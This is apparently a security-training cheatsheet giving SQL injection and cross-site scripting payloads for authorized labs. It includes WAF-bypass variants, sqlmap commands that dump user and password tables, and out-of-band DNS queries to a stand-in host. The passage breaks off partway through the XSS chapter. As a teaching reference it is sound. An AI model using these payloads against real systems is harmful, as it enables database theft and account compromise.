# Handbook for Looking Up and Testing Security Vulnerabilities

> [!CAUTION]
> Only practice in a local lab or clearly authorized system. See `AUTHORIZED_USE.md` before using the payload.

This file gathers all 15 chapters of the cheatsheet into a single Markdown document for easy reading, searching, and storage.

## Quick Lookup by OWASP

| Cheatsheet Chapter | Suggested Web/API tags | Related Lesson |
|---|---|---|
| 1. SQL Injection | OWASP Web A03:2021 Injection; OWASP API8:2019 Injection | [SQL Injection](05-injection/sql-injection/), [Second-order SQLi](05-injection/second-order-sqli/) |
| 2. Cross-Site Scripting | OWASP Web A03:2021 Injection | [XSS](05-injection/xss/), [CSP Bypass](02-security-misconfiguration/csp-bypass/), [DOM Clobbering](05-injection/dom-clobbering/) |
| 3. SSRF | OWASP Web A10:2021 SSRF; OWASP API7:2023 SSRF | [SSRF](01-broken-access-control/ssrf/), [API SSRF](11-api-security/server-side-request-forgery/), [XXE](05-injection/xxe/) |
| 4. XXE | OWASP Web A05:2021 Security Misconfiguration; OWASP API8:2023 Security Misconfiguration | [XXE](05-injection/xxe/), [XML Bombs](10-exceptional-conditions/xml-bombs/) |
| 5. LFI/RFI + Path Traversal | OWASP Web A01:2021 Broken Access Control; OWASP Web A05:2021 Security Misconfiguration | [LFI/RFI](05-injection/lfi-rfi/), [Directory Traversal](01-broken-access-control/directory-traversal/) |
| 6. Command Injection | OWASP Web A03:2021 Injection; OWASP API8:2019 Injection | [Command Execution](05-injection/command-execution/), [Code Injection](05-injection/code-injection/) |
| 7. IDOR / Broken Access Control | OWASP Web A01:2021 Broken Access Control; OWASP API1:2023 BOLA; OWASP API5:2023 BFLA | [IDOR](01-broken-access-control/idor/), [API BOLA](11-api-security/broken-object-level-authorization/), [API BFLA](11-api-security/broken-function-level-authorization/), [Broken Access Control](01-broken-access-control/broken-access-control/) |
| 8. JWT Attacks | OWASP Web A07:2021 Identification and Authentication Failures; OWASP API2:2023 Broken Authentication | [JWT Attacks](07-authentication-failures/jwt-attacks/), [API Broken Authentication](11-api-security/broken-authentication/), [Weak Session IDs](07-authentication-failures/weak-session-ids/) || 9. SSTI | OWASP Web A03:2021 Injection; OWASP API8:2019 Injection | [SSTI](05-injection/ssti/), [Code Injection](05-injection/code-injection/) |
| 10. Deserialization | OWASP Web A08:2021 Software and Data Integrity Failures | [Insecure Deserialization](08-data-integrity-failures/insecure-deserialization/), [Prototype Pollution](08-data-integrity-failures/prototype-pollution/) |
| 11. CSRF | OWASP Web A01:2021 Broken Access Control; OWASP Web A07:2021 Identification and Authentication Failures | [CSRF](07-authentication-failures/csrf/), [Lax Security Settings](02-security-misconfiguration/lax-security-settings/) |
| 12. CORS Misconfiguration | OWASP Web A05:2021 Security Misconfiguration; OWASP API8:2023 Security Misconfiguration | [CORS](02-security-misconfiguration/cors/), [Lax Security Settings](02-security-misconfiguration/lax-security-settings/) |
| 13. File Upload Bypass | OWASP Web A03:2021 Injection; OWASP Web A05:2021 Security Misconfiguration; OWASP API4:2023 Unrestricted Resource Consumption | [File Upload](06-insecure-design/file-upload/), [LFI/RFI](05-injection/lfi-rfi/) |
| 14. Open Redirect | OWASP Web A01:2021 Broken Access Control; OWASP API10:2023 Unsafe Consumption of APIs | [Open Redirects](01-broken-access-control/open-redirects/), [Unsafe Consumption of APIs](11-api-security/unsafe-consumption-of-apis/), [OAuth Vulnerabilities](07-authentication-failures/oauth-vulnerabilities/) |
| 15. Buffer Overflow / Binary Analysis | CWE-120; OWASP Web A06:2021 Vulnerable and Outdated Components; OWASP API4:2023 Unrestricted Resource Consumption | [Buffer Overflows](10-exceptional-conditions/buffer-overflows/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/) |

## Table of Contents
- 1. SQL Injection (SQLi)
- 2. Cross-Site Scripting (XSS)
- 3. Server-Side Request Forgery (SSRF)
- 4. XML External Entity (XXE)
- 5. LFI/RFI + Path Traversal
- 6. Command Injection (OS Injection)
- 7. IDOR / Broken Access Control
- 8. JWT Attacks
- 9. Server-Side Template Injection (SSTI)
- 10. Deserialization
- 11. CSRF (Cross-Site Request Forgery)
- 12. CORS Misconfiguration (Cross-Origin Resource Sharing)
- 13. File Upload Bypass
- 14. Open Redirect
- 15. Buffer Overflow / Binary Analysis

## 1. SQL Injection (SQLi)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

SQL Injection (SQLi) is a vulnerability that occurs when user input data is directly concatenated into an SQL statement without processing or parameterization, allowing attackers to interfere with the query logic of the database (DBMS).

> **Related Lesson:** [SQL Injection](05-injection/sql-injection/), [Second-order SQLi](05-injection/second-order-sqli/), [GraphQL Vulnerabilities](11-api-security/graphql-vulnerabilities/).

### 1.1. Error-based SQLi (Error-based SQL Injection)

*   **Identification / Signs**:
    *   *Notes*: Appears when the application directly displays detailed database management system error messages (DBMS Error Messages) on the user interface (User Interface) or in HTTP (HTTP Response). These error messages often contain table names, column names, or syntax error information.
    *   *English rewrite*: Error-based SQLi is identified when the application displays verbose database engine error messages (DBMS Error Messages) within the user interface or HTTP responses. These error messages often include table names, column names, or syntax error information.
*   **Suspicion / Testing**:
    *   *Notes*: Send syntax-breaking characters like single quotes (`'`), double quotes (`"`), parentheses (`(`, `)`), backslashes (`\`), or division-by-zero operations (`1/0`) into parameters. If the response returns status code HTTP `500 Internal Server Error` along with error information in the form of `SQL syntax error`, `Unclosed quotation mark`, or `Conversion failed`, it is highly likely there is a faulty input point.
    *   *English rewrite*: Send syntax-breaking characters such as single quotes (`'`), double quotes (`"`), parentheses, backslashes (`\`), or division-by-zero operations into parameters. If the response returns status code HTTP with error messages such as `500` or `SQL syntax error`, it is highly likely the input point is vulnerable.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-01-001 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.1. Error-based SQLi (error-based SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: only the payload matching the selected DBMS produces the documented synthetic error/version marker; unsupported engine payloads are rejected -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. MySQL Error-based payload abusing `updatexml()` XML parser function.
    ' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)-- -

    -- 2. MySQL Error-based payload using `extractvalue()`.
    ' AND extractvalue(1, concat(0x7e, (SELECT @@version)))-- -

    -- 3. MySQL Error-based payload via `GTID_SUBSET()` function.
    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -

    -- 4. MSSQL datatype conversion error (converting version string @@version to integer).
    ' AND CAST((SELECT @@version) AS INT)=1-- -

    -- 4b. PostgreSQL datatype conversion error (converting version() string to integer).
    ' AND CAST(version() AS INT)=1-- -

    -- 5. Generic DBMS division-by-zero error payload (⚠️ MySQL Note: MySQL only returns NULL and raises a warning; this triggers database errors on PostgreSQL/MSSQL).
    '; SELECT 1/0-- -

    -- 6. PostgreSQL datatype conversion error to leak table names.
    ' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- -

    -- 7. Oracle XMLType parsing error payload to retrieve current user.
    ' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL-- -

    -- 8. Oracle database error using the `ctxsys.drithsx.sn` function.
    ' AND (SELECT ctxsys.drithsx.sn(1, (SELECT user FROM dual)) FROM dual) IS NOT NULL-- -

    -- 9. MySQL JSON function error.
    ' OR JSON_KEYS((SELECT CONCAT(0x7e, version(), 0x7e)))-- -

    -- 10. URL encoded, mixed-case, and `#` comment character replacing `--` to bypass naive pattern-matching WAF rules.
    %27%20aNd%20ExtractValue(1,%20conCat(0x7e,%20(seLeCt%20veRsIoN()),%200x7e))%23
    ```
*   **Automatic Tool**:
    *   *Notes*: Use sqlmap to automatically scan for detection and exploit the Error-based SQLi vulnerability by restricting the scanning technique (`--technique=E`).<!-- payload-id: CHEAT-01-002 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.1. Error-based SQLi (error-based SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the payload matching the selected DBMS produces the documented synthetic error/version marker; unsupported engine payloads are rejected; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect error-based SQLi on target parameter 'id'
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=E --batch --banner
    # Extract database names using error-based technique
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=E --dbs --batch
    ```

---


### 1.2. Union-based SQLi (SQL Injection based on union)

*   **Identification / Signs**:
    *   *Notes*: Appears when the data returned from the original SQL query is displayed directly on the interface. The attacker uses the `UNION` operator to combine the original query results with another arbitrary query, thereby extracting sensitive information from other tables.
    *   *English rewrite*: Union-based SQLi occurs when the query results are rendered directly on the web page. Attackers inject the `UNION` operator to combine the original query results with an arbitrary query to retrieve records from other database tables.
*   **Suspicion / Testing**:
    *   *Notes*:
        1. Determine the number of columns in the original query using the `ORDER BY` clause: Gradually increase the index (`ORDER BY 1`, `ORDER BY 2`,...) until the web page changes behavior or shows an error.
        2. Determine the data type of each column by inserting `NULL` or specific values: `' UNION SELECT NULL, NULL, NULL-- -`.
    *   *English rewrite*:
        1. Determine column count using `ORDER BY N` (increment N until the page structure changes or throws an error).
        2. Determine column data types by injecting `NULL` values or string constants: `' UNION SELECT 'a', NULL, 3-- -`.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-01-003 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.2. Union-based SQLi (union-based SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: the three-column fixture renders only the selected synthetic columns when column count/types match; the parameterized control returns no injected rows -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. Test if the table has at least 1 column.
    ' ORDER BY 1-- -

    -- 2. Test if the table has at least 10 columns.
    ' ORDER BY 10-- -

    -- 3. 3-column NULL injection (generic compatibility test).
    ' UNION SELECT NULL, NULL, NULL-- -

    -- 4. Test if the first column accepts string values.
    ' UNION SELECT 'a', NULL, NULL-- -

    -- 5. Extract MySQL/MSSQL database version (rendered in the 2nd column).
    ' UNION SELECT NULL, @@version, NULL-- -

    -- 6. Extract PostgreSQL database version.
    ' UNION SELECT NULL, version(), NULL-- -

    -- 7. Extract Oracle database banner.
    ' UNION SELECT NULL, banner, NULL FROM v$version WHERE ROWNUM=1-- -

    -- 8. Extract all tables and databases (MySQL/PostgreSQL/MSSQL).
    ' UNION SELECT table_schema, table_name, NULL FROM information_schema.tables-- -

    -- 9. Extract column names and data types of the `users` table.
    ' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users'-- -

    -- 10. Uses MySQL-specific comment syntax (`/*!50000... */`) and mixed-case to bypass strict signature-based WAFs.
    /*!50000%55nion*//*!50000%53elect*/+1,username,password+FRoM+users--+-
    ```
*   **Automated Tool**:
    *   *Notes*: Use sqlmap with Union-based technique (`--technique=U`) to determine the number of columns and extract data at high speed.
    *   *English rewrite*: Use sqlmap with Union-based technique (`--technique=U`) to automatically determine columns and perform high-speed data extraction.<!-- payload-id: CHEAT-01-004 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.2. Union-based SQLi (union-based SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the three-column fixture renders only the selected synthetic columns when column count/types match; the parameterized control returns no injected rows; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect union-based SQLi and verify column count automatically
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=U --batch --banner
    # Dump tables from specific database using Union technique
    sqlmap -u "http://victim.lab.test/product.php?id=1" -D app_db --tables --dump --batch
    ```

---

### 1.3. Blind Boolean-based SQLi (SQL True/False Logic Blind Injection)

*   **Identification / Signs**:
    *   *Notes*: When the application does not return query data or specific error information, but the response structure or the displayed content of the webpage changes (e.g., showing "Welcome" vs. "Account not found") based on whether the input query logic is True or False.
    *   *English rewrite*: Boolean-based blind SQLi is present when the application does not display query data or errors, but its response changes dynamically (e.g., displaying different text elements or status codes) depending on whether the injected condition evaluates to True or False.
*   **Suspicion / Verification**:
    *   *Notes*: Insert logical expressions that are always true (`AND 1=1`) and always false (`AND 1=2`). Compare differences in responses (Response length, appearance of specific keywords). If the `AND 1=1` result resembles a normal page, while `AND 1=2` causes missing data or changes the page structure, the vulnerability exists.
    *   *English rewrite*: Inject logical conditions that are always true (`AND 1=1`) and always false (`AND 1=2`). Compare response lengths or text changes. If the "true" input mirrors normal behavior while the "false" input alters the page output, it indicates SQLi.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-01-005 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.3. Blind Boolean-based SQLi (boolean-based blind SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: the true and false predicates produce the two seeded response markers; the parameterized control makes both inputs data rather than SQL -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. True logical assertion (normal response expected).
    ' AND 1=1-- -

    -- 2. False logical assertion (modified response expected).
    ' AND 1=2-- -

    -- 3. Verify that subqueries are functional.
    ' AND (SELECT 1)=1-- -

    -- 4. Brute-force character check for database version (MySQL).
    ' AND SUBSTRING((SELECT @@version),1,1)='5'-- -

    -- 5. Compare the ASCII value of the first character of the username.
    ' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>97-- -

    -- 6. Boolean evaluation using `IIF` (MSSQL).
    ' AND (SELECT IIF(1=1, 1, 0))=1-- -

    -- 7. DBMS-agnostic conditional logic check.
    ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)=1-- -

    -- 8. Check if the database name length is greater than 1.
    ' AND LENGTH((SELECT database()))>1-- -

    -- 9. Check if user `admin` exists in the database.
    ' AND (SELECT EXISTS(SELECT * FROM users WHERE username='admin'))-- -

    -- 10. Uses hex representation (`0x61646d696e` for `admin`), `LIKE` operator instead of `=`, and multi-line comments `/**/` to bypass signature filters on spaces and strings.
    'oR(username/**/Like/**/0x61646d696e)-- -
    ```
*   **Automatic Tool**:
    *   *Notes*: Use sqlmap with Boolean-blind technique (`--technique=B`) to exploit and extract data through True/False logic questions.
    *   *English rewrite*: Use sqlmap with Boolean-blind technique (`--technique=B`) to exploit and extract database records through True/False questions.<!-- payload-id: CHEAT-01-006 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.3. Blind Boolean-based SQLi (boolean-based blind SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the true and false predicates produce the two seeded response markers; the parameterized control makes both inputs data rather than SQL; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect boolean-based blind SQLi using customized threat levels
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=B --level=3 --risk=2 --batch
    # Extract users password hash using Boolean-blind queries
    sqlmap -u "http://victim.lab.test/product.php?id=1" -D app_db -T users -C username,password --dump --batch
    ```

---

### 1.4. Blind Time-based SQLi (Time-based Blind SQL Injection)

*   **Recognition / Signs**:
    *   *Notes*: When the application does not change its interface or response structure for any True/False condition. The only recognizable sign is the server's processing and response time (Response Latency) significantly increasing when an attacker injects commands that delay execution time (Time Delay functions).
    *   *English rewrite*: Time-based blind SQLi is characterized by responses that do not vary in content, but the database execution latency (response delay) increases when delay functions are triggered under specific logical conditions.
*   **Suspicion / Testing**:
    *   *Notes*: Inject statements that cause system delays (such as `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY`). Measure the server response time; if the response time increases corresponding to the number of seconds configured in the payload, that entry point is highly likely affected.
    *   *English rewrite*: Inject database delay queries (such as `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY`) and measure request round-trip time. If the response delay corresponds to the injected parameter, the application is vulnerable.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-01-007 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.4. Blind Time-based SQLi (time-based blind SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: a single bounded request adds approximately five seconds only on the named DBMS; the control and fixed query stay within the baseline latency envelope -->
<!-- risk: dos -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. Triggers 5 seconds sleep in MySQL.
    ' AND SLEEP(5)-- -

    -- 2. Triggers 5 seconds sleep in MSSQL.
    '; WAITFOR DELAY '0:0:5'-- -

    -- 3. Triggers 5 seconds sleep in PostgreSQL.
    ' AND pg_sleep(5)-- -

    -- 4. Triggers 5 seconds sleep in Oracle.
    ' AND (SELECT dbms_pipe.receive_message('a',5) FROM dual)-- -

    -- 5. Subquery-based sleep function for MySQL.
    ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -

    -- 6. Stacked query PostgreSQL sleep execution.
    '; SELECT pg_sleep(5)-- -

    -- 7. Conditional sleep in MySQL.
    ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -

    -- 8. Conditional sleep in MSSQL.
    '; IF (1=1) WAITFOR DELAY '0:0:5'-- -

    -- 9. Oracle time delay combined with string concatenation.
    '||(SELECT 'a' FROM dual WHERE 1=1 AND dbms_pipe.receive_message('a',5)=1)||'

    -- 10. Uses bitwise ampersands `%26` and nested subqueries to obscure the `sleep` function from WAF filters.
    %27%26(select*from(select(sleep(5)))a)%26%27
    ```
*   **Automatic Tool**:
    *   *Notes*: Use sqlmap with Time-blind technique (`--technique=T`) to scan for delayed database responses.
    *   *English rewrite*: Use sqlmap with Time-blind technique (`--technique=T`) to scan and detect database latency delays.<!-- payload-id: CHEAT-01-008 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.4. Blind Time-based SQLi (time-based blind SQL Injection) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: a single bounded request adds approximately five seconds only on the named DBMS; the control and fixed query stay within the baseline latency envelope; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect time-based blind SQLi and optimize delay settings
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=T --time-sec=5 --batch
    # Bypass WAF filtering using space2comment and charencode tamper scripts
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=T --tamper=space2comment,charencode --random-agent --batch
    ```

---

### 1.5. Blind Out-of-Band SQLi qua DNS local fixture

*   **Recognition / Signs**:
    *   *Notes*: The HTTP response does not change, but the internal fixture DNS recorder logs queries containing a synthetic marker after the payload runs.
*   **Suspicion / Verification**:
    *   *Notes*: Only use the `.lab.test` domain pointing to the internal DNS sink, do not use the public DNS service. The marker must be synthetic data like `sqli-oob-001`, not secrets, PII, or real data.

<!-- payload-id: CHEAT-01-009 -->
<!-- context: MySQL 8.0.36 on Windows-style UNC resolver path, SQL Server 2022 CU12 xp_dirtree, and Oracle 19c UTL_INADDR inside disposable lab fixtures; DNS zone dnslog.lab.test resolves only to the local recorder -->
<!-- prerequisites: enable the OOB feature only in the named fixture, block public outbound DNS, seed a synthetic marker table, and reset DB privileges/configuration after each case -->
<!-- encoding: ASCII SQL fragments inserted once into the stated vulnerable parameter; labels are lower-case DNS-safe and each DBMS line is tested separately -->
<!-- expected-result: the local DNS recorder receives one lookup containing only the synthetic marker for the selected DBMS; the fixed query path produces no DNS lookup -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-18 -->
```sql
-- MySQL lab on Windows-style path resolution: synthetic marker only.
' AND LOAD_FILE(CONCAT('\\\\', (SELECT 'sqli-oob-001'), '.dnslog.lab.test\\share')) IS NULL-- -

-- SQL Server lab with xp_dirtree enabled only inside the fixture.
'; DECLARE @m varchar(64)='sqli-oob-001'; EXEC master..xp_dirtree '\\'+@m+'.dnslog.lab.test\share'-- -

-- Oracle lab where UTL_INADDR is explicitly granted to the test schema.
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT 'sqli-oob-001' FROM dual)||'.dnslog.lab.test') IS NOT NULL-- -

-- sqlmap pointed at the local DNS sink, not an internet callback provider.
-- sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=T --dns-domain=dnslog.lab.test --batch
```

---

## References

- **[S1]** OWASP SQL Injection Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 2. Cross-Site Scripting (XSS)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

Cross-Site Scripting (XSS) occurs when an application receives untrusted data and displays/executes it in the user's browser as script code (JavaScript) without encoding or sanitizing it.

> **Related Lessons:** [XSS](05-injection/xss/), [CSP Bypass](02-security-misconfiguration/csp-bypass/), [DOM Clobbering](05-injection/dom-clobbering/).

### 2.1. Reflected XSS (Reflected XSS)

*   **Identification / Signs**:
    *   *Notes*: Occurs when a malicious script is included in the HTTP request sent by a victim, then the server directly reflects this script into the response page content without storing it in the database.
    *   *English rewrite*: Reflected XSS occurs when a malicious script is included in the HTTP request sent by a victim. The server immediately reflects this script back into the HTTP response without persisting it in the database.
*   **Suspicion / Checking**:
    *   *Notes*: Enter a unique random string (e.g., `xsscheck123`) into input parameters (URL Parameters, Search box). Check the page source (Page Source) or DevTools Elements to locate where the string appears to determine the context (HTML tag, tag attribute, or script block).
    *   *English rewrite*: Input a unique string (e.g., `xsscheck123`) into input fields or parameters. Inspect the DOM/Page Source to find where the string is reflected and identify the target context (HTML context, attribute context, or JavaScript context).
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-02-001 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.1. Reflected XSS (reflected XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the vulnerable sink produces the local dialog or DOM marker once; context-correct encoding in the fixed fixture renders the bytes as text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Classic simple script execution payload. -->
    <script>alert(1)</script>

    <!-- 2. Breaks out of an HTML attribute to execute a script. -->
    "><script>alert(document.domain)</script>

    <!-- 3. Executes script via the image error event handler (bypass for blocked `<script>` tags). -->
    <img src=x onerror=alert(1)>

    <!-- 4. SVG onload event execution. -->
    <svg onload=alert(1)>

    <!-- 5. Injected into `href` or `src` attributes of anchors/frames. -->
    javascript:alert(1)

    <!-- 6. Breaks out of a JavaScript string variable definition. -->
    '-alert(1)-'

    <!-- 7. Closes an existing script tag and initiates a new one. -->
    </script><script>alert(1)</script>

    <!-- 8. Sub-document sandboxed execution payload. -->
    <iframe src="javascript:alert(1)"></iframe>

    <!-- 9. Body load event handler payload. -->
    <body onload=alert(1)>

    <!-- 10. Uses Base64 encoded payload (`YWxlcnQoMSk=` represents `alert(1)`) decoded at runtime via `eval(atob())`, with a slash separator `svg/onload` to bypass space and keyword signature-based WAFs. -->
    <svg/onload=eval(atob('YWxlcnQoMSk='))>
    ```
*   **Automatic Tool**:
    *   *Notes*: Use XSStrike to analyze parameter contexts or dalfox to scan for bulk Reflected XSS vulnerabilities.
    *   *English rewrite*: Use XSStrike to analyze reflected parameter contexts or dalfox for fast bulk reflected XSS scanning.<!-- payload-id: CHEAT-02-002 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.1. Reflected XSS (reflected XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable sink produces the local dialog or DOM marker once; context-correct encoding in the fixed fixture renders the bytes as text; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Scan Reflected XSS using XSStrike parameter detection
    python xsstrike.py -u "http://victim.lab.test/search.php?q=test"
    # Scan Reflected XSS with fast multi-threading tool dalfox
    dalfox url "http://victim.lab.test/search?q=test"
    ```

---


### 2.2. Stored XSS (XSS stored)

*   **Identification / Signs**:
    *   *Notes*: Occurs when malware is permanently stored in a database or file on the server (e.g., comments, forum lessons, account information). Any user who accesses the page displaying this data then triggers the malware in the browser.
*   **Suspect / Check**:
    *   *Notes*: Look for functions that allow long-term storage of information and display it to other users (comment boxes, contact submission forms, display name updates). Test by submitting HTML formatting tags and reload the page or log in with another account to see if the tag displays raw.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-02-003 -->
<!-- context: Chromium 126 with an Express 4.19 two-origin fixture; each payload is applied only to its named HTML, attribute, URL or DOM sink; case: 2.2. Stored XSS (stored XSS) -->
<!-- prerequisites: serve the exact sink from loopback, use a fresh browser profile and synthetic cookie, and map callback.lab.test to a local recorder with outbound network blocked -->
<!-- encoding: UTF-8 text/html; HTML/JavaScript is parsed by the pinned browser and query/hash fragments are percent-encoded exactly once when transported -->
<!-- expected-result: the synthetic payload is stored and creates a local DOM/callback marker when viewed in the vulnerable profile; the fixed profile renders inert text -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```html
    <!-- 1. Basic stored testing payload. -->
    <script>alert('StoredXSS')</script>

    <!-- 2. Attempts session hijacking by exposing session cookies (if HTTPOnly is missing). -->
    <img src="empty.jpg" onerror="document.body.dataset.sechub='stored-xss-marker'">

